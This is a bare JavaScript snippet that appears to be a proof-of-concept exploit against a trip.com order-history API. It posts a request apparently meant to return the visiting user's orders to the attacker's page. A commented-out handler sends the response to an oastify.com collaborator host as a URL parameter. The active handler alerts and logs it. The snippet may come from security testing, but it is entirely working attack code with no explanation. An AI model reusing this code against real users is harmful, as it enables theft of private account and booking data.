const xhr = new XMLHttpRequest();
xhr.onload = reqListener
xhr.open('POST', 'https://www.trip.com/restapi/soa2/10098/GetOrderWithBM.json');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"OrderStatusClassify":"All","PageIndex":1,"PageSize":15,"BizTypes":[],"FilterValidOrder":false,"BookingDateTime":"","BeginBookingDateTime":"","EndBookingDateTime":"","FilterRequiredOrderIDArray":[],"NeedOrderAmountDetail":false,"ClientVersion":"99.99","Channel":"IBUOnline","Locale":"en-XX","head":{"cid":"","ctok":"","cver":"1.0","lang":"01","sid":"","syscode":"09","auth":"","extension":[{"name":"protocal","value":"https"},{"name":"sequence","value":""}]}}');


// function reqListener() {
//     location='//f7nmrkkvcyh127bxvxw7lo6sqjwak08p.oastify.com/log?key='+this.responseText; 
// };

function reqListener() {
    alert(this.responseText) 
    console.log(this.responseText);
};
